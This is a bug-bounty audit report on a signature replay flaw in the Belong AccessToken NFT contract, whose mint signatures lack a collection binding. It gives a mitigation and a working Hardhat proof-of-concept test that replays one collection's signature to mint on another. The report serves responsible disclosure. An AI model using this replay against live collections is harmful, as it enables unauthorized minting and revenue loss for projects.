# 57194 sc medium signature replay across collections missing contract binding&#x20;

**Submitted on Oct 24th 2025 at 09:17:57 UTC by @xKeywordx for** [**Audit Comp | Belong**](https://immunefi.com/audit-competition/audit-comp-belong)

* **Report ID:** #57194
* **Report Type:** Smart Contract
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-belong/blob/main/contracts/v2/tokens/AccessToken.sol>
* **Impacts:**
  * Unauthorized minting of NFTs

## Summary

`AccessToken::mintStaticPrice` and `mintDynamicPrice` rely on backend-signed payloads that are verified in `SignatureVerifier.checkStaticPriceParameters` / `checkDynamicPriceParameters`.

The signed hash includes:

* `receiver`
* `tokenId`
* `tokenUri`
* `whitelisted` for static or `price` for dynamic
* `block.chainid`

Crucially, it does *not* include the collection's contract address, the factory address, or any unique collection identifier.

As a result, a signature produced for **Collection A** on chain X is also valid for **Collection B** on the same chain, as long as both collections use the same `signerAddress` stored in their Factory. A user can obtain a valid signature for one collection, and replay that signature to mint on a different collection, leading to **unauthorized minting of NFTs**.

Examples of consequences:

* User whitelisted for Collection A (but not B) can mint on Collection B using the same signature.
* If dynamic pricing differs across collections, a low-price signature for Collection A can be replayed on Collection B to mint at the lower price, causing revenue loss.

## Root cause

The signed digest omits `address(this)` (the target collection that the signature is intended to be used with) or any unique collection identifier.

## Impact

{% hint style="warning" %}

* Cross-collection allowlist bypass: a user allowlisted (and signed) for Collection A can mint on Collection B at B’s whitelist price by replaying the same signature, even if they were not allowlisted for B.
* Cross-collection price bypass (dynamic pricing): A low-price signature intended for Collection A can be replayed on Collection B to mint at that low price.
* Economics distortion: Attackers can mint in collections where they were not approved or at unintended prices, impacting revenue and payouts.
  {% endhint %}

## Recommended mitigation

Consider adding a unique collection identifier to the signed payload (for example `address(this)` or the collection contract address) so signatures are bound to a specific collection.

## Proof of Concept

The following test demonstrates signature replay across two deployed collections that share the same signer on the same chain.

Step overview:

{% stepper %}
{% step %}

### Step — Obtain a signature for Collection A

The backend signer issues a "whitelisted" mint signature (note: the signed digest currently does not include the collection address).

Example (in the PoC test, this uses EthCrypto to compute the same digest shape as the contract expects):

```javascript
const POC_URI = 'replay-poc.example/1';
const msgHash = EthCrypto.hash.keccak256([
  { type: 'address', value: creator.address },
  { type: 'uint256', value: 0 }, // tokenId
  { type: 'string', value: POC_URI }, // tokenUri
  { type: 'bool', value: true }, // whitelisted = true
  { type: 'uint256', value: chainId },
]);
const sig = EthCrypto.sign(signer.privateKey, msgHash);
```

{% endstep %}

{% step %}

### Step — Use signature on Collection A (expected)

Use the signature to mint on Collection A (native ETH payment path). This succeeds as intended.

```javascript
await accessTokenEth.connect(creator).mintStaticPrice(
  creator.address,
  [
    {
      tokenId: 0,
      tokenUri: POC_URI,
      whitelisted: true,
      signature: sig,
    },
  ],
  NATIVE_CURRENCY_ADDRESS,
  ethPurchasePrice.div(2),
  { value: ethPurchasePrice.div(2) },
);
```

{% endstep %}

{% step %}

### Step — Reuse same signature on Collection B (unexpected)

Reuse the exact same signature on Collection B (ERC20 payment path). This also succeeds, even though the signature was issued for Collection A and not intended for Collection B.

```javascript
await accessTokenERC20.connect(creator).mintStaticPrice(
  creator.address,
  [
    {
      tokenId: 0,
      tokenUri: POC_URI,
      whitelisted: true,
      signature: sig,
    },
  ],
  erc20Example.address,
  tokenPurchasePrice / 2,
);
```

This results in unauthorized minting on Collection B.
{% endstep %}
{% endstepper %}

Full test code used in the PoC (place inside the `describe('Mint', () => {` block in `test/v2/tokens/accessToken.test.ts`):

```javascript
it('Signature replay across collections on same signer/chain', async () => {
  // Use the shared fixture that already deploys two collections with the SAME signer.
  const {
    accessTokenEth, // Collection A (pays native)
    accessTokenERC20, // Collection B (pays ERC20)
    erc20Example,
    creator,
    signer,
  } = await loadFixture(fixture);

  // Ensure creator has ERC20 and approval for collection B.
  await erc20Example.connect(creator).mint(creator.address, tokenPurchasePrice);
  await erc20Example.connect(creator).approve(accessTokenERC20.address, ethers.constants.MaxUint256);

  // Step 1: Backend signer issues a "whitelisted" mint signature
  const POC_URI = 'replay-poc.example/1';
  const msgHash = EthCrypto.hash.keccak256([
    { type: 'address', value: creator.address },
    { type: 'uint256', value: 0 }, // tokenId
    { type: 'string', value: POC_URI }, // tokenUri
    { type: 'bool', value: true }, // whitelisted = true
    { type: 'uint256', value: chainId },
  ]);
  const sig = EthCrypto.sign(signer.privateKey, msgHash);

  //  Step 2: Use it on collection A (ETH) at whitelist price
  expect(await accessTokenEth.balanceOf(creator.address)).to.equal(0);
  await accessTokenEth.connect(creator).mintStaticPrice(
    creator.address,
    [
      {
        tokenId: 0,
        tokenUri: POC_URI,
        whitelisted: true,
        signature: sig,
      },
    ],
    NATIVE_CURRENCY_ADDRESS,
    ethPurchasePrice.div(2),
    { value: ethPurchasePrice.div(2) },
  );
  expect(await accessTokenEth.balanceOf(creator.address)).to.equal(1);

  //  Step 3: Reuse the exact same signature on collection B (ERC20)
  // This succeeds even though the signature was not intended for this collection.
  expect(await accessTokenERC20.balanceOf(creator.address)).to.equal(0);
  await accessTokenERC20.connect(creator).mintStaticPrice(
    creator.address,
    [
      {
        tokenId: 0,
        tokenUri: POC_URI,
        whitelisted: true,
        signature: sig,
      },
    ],
    erc20Example.address,
    tokenPurchasePrice / 2,
  );
  expect(await accessTokenERC20.balanceOf(creator.address)).to.equal(1);
});
```

Test output:

```
yarn hardhat test test/v2/tokens/accessToken.test.ts --grep "Signature replay across collections on same signer/chain"
yarn run v1.22.22
warning package.json: No license field
$ /home/keyword/competitive-audits/audit-comp-belong/node_modules/.bin/hardhat test test/v2/tokens/accessToken.test.ts --grep 'Signature replay across collections on same signer/chain'
secp256k1 unavailable, reverting to browser version


  AccessToken
    Mint

      ✔ Signature replay across collections on same signer/chain (790ms)


  1 passing (1s)

Done in 2.90s.
```

\-- End of report.
